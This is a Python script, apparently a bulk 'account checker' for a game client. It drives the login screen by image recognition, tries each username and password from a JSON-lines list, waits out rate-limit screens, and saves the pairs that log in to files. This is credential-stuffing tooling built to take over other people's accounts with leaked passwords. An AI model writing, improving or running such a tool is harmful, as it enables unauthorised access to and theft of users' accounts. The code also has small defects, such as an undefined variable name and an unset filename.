import time
import lackey
import jsonlines
from time import sleep
from win32com.client import Dispatch
from pyautogui import typewrite, hotkey



image_path = r"C:\\Users\\Sylar\\pyscripts3\\freelancer\\Z9x_DB\\BulkChecker\\RS_CHECKER\\images"

existing_user = lackey.Pattern(image_path + "\\existing_user.png")
login_text = lackey.Pattern(image_path + "\\login_text.png")
password_text = lackey.Pattern(image_path + "\\password_text.png")
login = lackey.Pattern(image_path + "\\login.png")
try_again = lackey.Pattern(image_path + "\\try_again.png")
cancel = lackey.Pattern(image_path + "\\cancel.png")
back = lackey.Pattern(image_path + "\\back.png")
stolen = lackey.Pattern(image_path + "\\stolen.png")
disabled = lackey.Pattern(image_path + "\\disabled_account.PNG")
billing_system = lackey.Pattern(image_path + "\\billing_system.PNG")
too_many_login_attemtps = lackey.Pattern(image_path + "\\too_many_login_attempts.png")
logout_button = lackey.Pattern(image_path + "\\logout_button.png")
click_to_play = lackey.Pattern(image_path + "\\click_to_play.png")
click_to_logout = lackey.Pattern(image_path + "\\click_here_to_logout.png")
authenticated = lackey.Pattern(image_path + "\\authenticated.png")
accept = lackey.Pattern(image_path + "\\accept.png")
report = lackey.Pattern(image_path + "\\report.png")


screen = lackey.Screen()
lackey.Settings.MoveMouseDelay = 0
lackey.Settings.InfoLogs = False
lackey.Settings.ActionLogs = False
lackey.Settings.UserLogs = False
lackey.Settings.SlowMotionDelay = 0
lackey.Settings.ObserveScanRate = 10

def alert():
	speak = Dispatch("SAPI.SpVoice")
	speak.Speak("Alert")

def clicker(image):
	while True:
		if screen.exists(image):
			screen.click(image)
			break
		
def attempt(username, password):
	start = time.time()
	print("username: " + username)
	print("password: " + password)
	print()
	sleeper = 0
	clicker(existing_user)
	clicker(image=login_text)
	clicker(image=login_text)
	typewrite(username)
	clicker(image=password_text)
	clicker(image=password_text)
	typewrite(password)
	clicker(image=login)
	
	while sleeper < 15:
		sleeper += 1
		if screen.exists(try_again):
			clicker(image=try_again)
			clicker(image=cancel)
			return False
		if screen.exists(stolen):
			clicker(image=back)
			clicker(image=cancel)
			return False
		if screen.exists(disabled):
			clicker(image=back)
			clicker(image=cancel)
			return False
		if screen.exists(authenticated):
			clicker(image=cancel)
			my_dict = dict()
			my_dict['Username'] = username
			my_dict['Password'] = password
			my_dict['Authenticated'] = 'Yes'
			with jsonlines.open('authenticated_accounts.json','a') as writer:
				writer.write(my_dict)
			return False
		if screen.exists(too_many_login_attemtps):
			sleep(60)
			clicker(image=login)
		if screen.exists(billing_system):
			clicker(image=cancel)
			return False
		if screen.exists(logout_button):
			clicker(image=logout_button)
			clicker(image=click_to_logout)
			return True
		if screen.exists(click_to_play):
			clicker(image=click_to_play)
			clicker(image=logout_button)
			return True
		if screen.exists(accept):
			alert()
			clicker(image=accept)
			clicker(image=logout_button)
			clicker(image=click_here_to_logout)
		if screen.exists(report):
			alert()
			return True
		
		
		
		#sleep(1)
		end = time.time()
		total = str(float(end-start))
		print(total)
	
def main(filename):
	with jsonlines.open(filename,'r') as reader:
		for obj in reader:
			user = obj['Username']
			passwd = obj['Password']
			my_var = attempt(username=user, password=passwd)
			if my_var:
				my_dict = dict()
				my_dict['Username'] = user
				my_dict['Password'] = passwd
				with jsonlines.open('accounts.json','a') as writer:
					writer.write(my_dict)
			
			
if __name__ == "__main__":
	main(filename)
